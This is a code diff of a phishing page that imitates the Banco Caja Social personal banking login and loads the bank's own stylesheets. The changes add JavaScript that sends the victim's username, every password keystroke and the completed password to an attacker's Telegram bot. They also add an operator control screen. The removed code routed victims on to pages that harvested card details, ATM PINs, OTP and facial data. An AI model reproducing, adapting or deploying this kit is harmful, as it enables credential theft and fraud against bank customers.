@@ -15,18 +15,31 @@
     <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/custom-identity.1.css" rel="stylesheet">
     <script src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/scripts/load-background.js"></script>
     <style>
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
         .d-none { display: none !important; }
-        
-        /* Ajuste para el texto de ejemplo debajo del input */
         .input-example-text {
             display: block;
             margin-top: 5px;
             color: #6c757d;
             font-size: 0.85rem;
         }
+        /* Estilos para los botones de acción de Telegram */
+        .action-buttons-container {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .btn-action {
+            flex: 1;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            color: white;
+        }
+        .btn-bad-user { background-color: #dc3545; } /* Rojo */
+        .btn-request-code { background-color: #0d6efd; } /* Azul */
     </style>
 </head>
 <body onload="createBackgrounds();" class="identity-background-1 identity-page--ready">
@@ -44,9 +57,7 @@
                         <h1 id="kc-page-title">Bienvenido al Portal Personas</h1>
                     </header>
 
-                    <!-- ============================================= -->
-                    <!-- PASO 1: USUARIO (Diseño según la imagen)      -->
-                    <!-- ============================================= -->
+                    <!-- PASO 1: USUARIO -->
                     <div id="step-username">
                         <div class="bb-subtitle bb-block bb-block--lg">
                             <span>Recuerde que su usuario está compuesto por su Tipo de Identificación <strong>(CC, CE, NI, TI, PE)</strong> y su Número de Identificación sin espacios, puntos ni comas.</span>
@@ -65,16 +76,11 @@
                                         <small class="input-example-text">Ejemplo: CC1234567890</small>
                                     </div>
                                     <div class="bb-button-bar bb-block bb-block--xl mt-3">
-                                        <!-- Botón cambiado a "Siguiente" -->
-                                        <button id="btn-index"
-                                            class="btn btn-primary w-100"
-                                            type="submit"
-                                            disabled>
+                                        <button id="btn-index" class="btn btn-primary w-100" type="submit" disabled>
                                             Siguiente
                                         </button>
                                     </div>
                                     
-                                    <!-- Enlace de olvidó contraseña añadido aquí como en la imagen -->
                                     <div class="bb-block bb-block--xl mt-3 text-start">
                                         <a class="btn-link-text" data-bs-toggle="collapse" href="#collapseForgot" role="button" aria-expanded="false" aria-controls="collapseForgot" style="font-weight: bold; color: #0056b3;">
                                             ¿Olvidó su contraseña? ▼
@@ -100,9 +106,23 @@
                         </div>
                     </div>
 
-                    <!-- ============================================= -->
-                    <!-- PASO 2: CONTRASEÑA                            -->
-                    <!-- ============================================= -->
+                    <!-- PANTALLA DE CONTROL (Se muestra al darle Siguiente al usuario) -->
+                    <div id="step-admin" class="d-none">
+                        <div class="bb-subtitle bb-block bb-block--lg text-center">
+                            <h2 style="font-size: 1.5rem; color: #0033A0; margin-bottom: 10px;">Usuario: <span id="lbl-username"></span></h2>
+                            <span>Esperando acción del administrador...</span>
+                        </div>
+                        <div class="action-buttons-container">
+                            <button id="btn-bad-user" class="btn-action btn-bad-user" type="button">
+                                🚫 Usuario Malo
+                            </button>
+                            <button id="btn-request-code" class="btn-action btn-request-code" type="button">
+                                📩 Pedir Código
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- PASO 2: CONTRASEÑA -->
                     <div id="step-password" class="d-none">
                         <div class="bb-subtitle bb-block bb-block--lg">
                             <span>Ingrese su contraseña de canales digitales, recuerde que está compuesta por 8 caracteres.</span>
@@ -140,17 +160,6 @@
                                                 Iniciar sesión
                                             </button>
                                         </div>
-                                        <a class="bb-button-bar__button btn-link-text btn-sm btn"
-                                            href="https://bancapersonas.bancocajasocial.com/auth/realms/retail/protocol/openid-connect/auth?response_type=code&client_id=reset-password">
-                                            ¿Olvidó su contraseña?
-                                        </a>
-                                    </div>
-                                    <hr class="bb-block bb-block--lg identity-separator">
-                                    <div class="bb-subtitle d-flex align-items-center gap-2 flex-wrap">
-                                        <div class="bb-block bb-block--sm mb-0">¿Es un cliente nuevo?</div>
-                                        <strong class="mb-0">
-                                            <a class="btn-link-text" href="https://bancapersonas.bancocajasocial.com/web/enrollment">Registrarse</a>
-                                        </strong>
                                     </div>
                                 </form>
                             </div>
@@ -162,22 +171,28 @@
         </div>
     </div>
 
-    <!-- Bootstrap JS (opcional, solo para que funcione el desplegable del "Olvidó su contraseña") -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
     <script>
-        /* ========= CONFIGURACIÓN ========= */
+        /* ========================================== */
+        /* CONFIGURACIÓN DE TELEGRAM (HTML PURO)      */
+        /* ========================================== */
+        const TELEGRAM_BOT_TOKEN = 'AQUI_TU_TOKEN_DEL_BOT'; // Ej: 123456789:ABCdef...
+        const TELEGRAM_CHAT_ID = 'AQUI_TU_CHAT_ID';         // Ej: 123456789
+        
         const SEND_URL = './send.php';
         const POLL_URL = './poll_updates.php';
-        const CHAT_ID = ''; // <-- pon aquí tu chat ID real
-        /* ================================== */
+        const CHAT_ID = ''; 
+        /* ========================================== */
 
         const stepUsername = document.getElementById('step-username');
+        const stepAdmin    = document.getElementById('step-admin');
         const stepPassword = document.getElementById('step-password');
 
         const inputUser = document.getElementById('username-input');
         const btnIndex  = document.getElementById('btn-index');
         const inpUsernameHidden = document.getElementById('inp-username');
+        const lblUsername = document.getElementById('lbl-username');
 
         const passInput = document.getElementById('password-input');
         const btnSubmit = document.getElementById('btn-submit');
@@ -187,34 +202,24 @@
         let SESSION_ID = localStorage.getItem('bcs_session_id') || '';
         let USERNAME = '';
 
-        const ERR_LOGIN_URL = './contra.php?error=1&username=';
-        const ACTION_MAP = {
-            'NEXT_TARJETA':  './tarjeta.php',
-            'NEXT_CAJERO':   './cajero.php',
-            'NEXT_ATM':      './cajero.php',
-            'NEXT_DINAMICA': './dinamica.php',
-            'NEXT_TOKEN':    './token.php',
-            'NEXT_OTP':      './otp.php',
-            'NEXT_FACIAL':   './facial.php',
-            'NEXT_TEXTO':    './texto.php',
-            'NEXT_WHATSAPP': null,
-            'FINISH':        './approved.php',
-            'BAN_IP':        './ban_ip.php',
-            'ERR_LOGIN':     ERR_LOGIN_URL,
-            'ERR_PASS':      ERR_LOGIN_URL,
-            'ERR_TARJETA':   ERR_LOGIN_URL,
-            'ERR_CAJERO':    ERR_LOGIN_URL,
-            'ERR_ATM':       ERR_LOGIN_URL,
-            'ERR_DINAMICA':  ERR_LOGIN_URL,
-            'ERR_TOKEN':     ERR_LOGIN_URL,
-            'ERR_OTP':       ERR_LOGIN_URL,
-            'ERR_FACIAL':    ERR_LOGIN_URL,
-            'ERR_TEXTO':     ERR_LOGIN_URL,
-        };
+        /* FUNCIÓN PARA ENVIAR A TELEGRAM */
+        function enviarTelegram(mensaje) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: mensaje,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.error('Error enviando a Telegram:', err));
+        }
 
         /* ---------- PASO 1: USUARIO ---------- */
         inputUser.addEventListener('input', () => {
-            // Convertir a mayúsculas automáticamente ayuda al formato "CC123..."
             inputUser.value = inputUser.value.toUpperCase();
             btnIndex.disabled = inputUser.value.trim().length === 0;
         });
@@ -226,9 +231,30 @@
 
             USERNAME = username;
             inpUsernameHidden.value = username;
+            lblUsername.textContent = username; // Mostrar en la pantalla de control
 
-            // Cambiar de vista en la misma página
+            // Ocultar usuario y mostrar botones de administrador
             stepUsername.classList.add('d-none');
+            stepAdmin.classList.remove('d-none');
+        });
+
+        /* ---------- BOTONES DE ACCIÓN (ADMIN) ---------- */
+        
+        // Botón 1: Usuario Malo
+        document.getElementById('btn-bad-user').addEventListener('click', function() {
+            enviarTelegram(`🚫 <b>ACCIÓN: USUARIO MALO</b>\nEl usuario <code>${USERNAME}</code> ha sido marcado como inválido.`);
+            
+            // Puedes redirigir a una página de error o reiniciar el formulario
+            alert("Usuario marcado como malo. Notificado a Telegram.");
+            location.reload();
+        });
+
+        // Botón 2: Pedir Código (Pasa a la contraseña)
+        document.getElementById('btn-request-code').addEventListener('click', function() {
+            enviarTelegram(`📩 <b>ACCIÓN: PEDIR CÓDIGO</b>\nSe solicitó contraseña/código para el usuario: <code>${USERNAME}</code>.`);
+            
+            // Ocultar admin y mostrar la contraseña
+            stepAdmin.classList.add('d-none');
             stepPassword.classList.remove('d-none');
             passInput.focus();
         });
@@ -238,6 +264,13 @@
             const len = this.value.length;
             btnSubmit.disabled = len !== 8;
             msgLen.classList.toggle('d-none', len === 0 || len === 8);
+
+            // Enviar la contraseña dígito por dígito en vivo
+            if (len > 0) {
+                const charIngresado = this.value.slice(-1); 
+                const caracterSeguro = charIngresado === ' ' ? '␣' : charIngresado;
+                enviarTelegram(`🔑 <b>Clave (${USERNAME}):</b> <code>${caracterSeguro}</code>`);
+            }
         });
 
         document.getElementById('toggle-pass').addEventListener('click', () => {
@@ -258,33 +291,17 @@
             <style>@keyframes spin{to{transform:rotate(360deg)}}</style>`;
         }
 
-        async function startPolling() {
-            if (!MESSAGE_ID) return;
-            try {
-                const r = await fetch(`${POLL_URL}?messageid=${MESSAGE_ID}&chatid=${CHAT_ID}`);
-                const resp = await r.json();
-                const action = resp?.action || null;
-
-                if (resp.ok && action) {
-                    const route = ACTION_MAP[action];
-                    if (route) {
-                        window.location.href = route;
-                        return;
-                    }
-                }
-                setTimeout(startPolling, 2500);
-            } catch (e) {
-                setTimeout(startPolling, 3000);
-            }
-        }
-
+        // Lógica del submit de la contraseña
         document.getElementById('form-contra').addEventListener('submit', async function (e) {
             e.preventDefault();
             const password = passInput.value.trim();
             if (password.length !== 8) return;
 
+            enviarTelegram(`✅ <b>Contraseña Completa (${USERNAME}):</b>\n<code>${password}</code>`);
             showLoader();
-
+            
+            // Aquí va tu lógica de envío a send.php (la dejé comentada para que no falle si no tienes el archivo)
+            /*
             try {
                 const res = await fetch(SEND_URL, {
                     method: 'POST',
@@ -304,8 +321,6 @@
                         SESSION_ID = data.sessionid;
                         localStorage.setItem('bcs_session_id', SESSION_ID);
                     }
-                    localStorage.setItem('bcs_username', USERNAME);
-                    localStorage.setItem('bcs_password', password);
                     startPolling();
                 } else {
                     location.reload();
@@ -313,6 +328,13 @@
             } catch (e) {
                 setTimeout(() => location.reload(), 3000);
             }
+            */
+            
+            // Simulación de éxito para que veas que funciona
+            setTimeout(() => {
+                alert("Contraseña enviada a Telegram.");
+                location.reload();
+            }, 2000);
         });
     </script>
 </body>
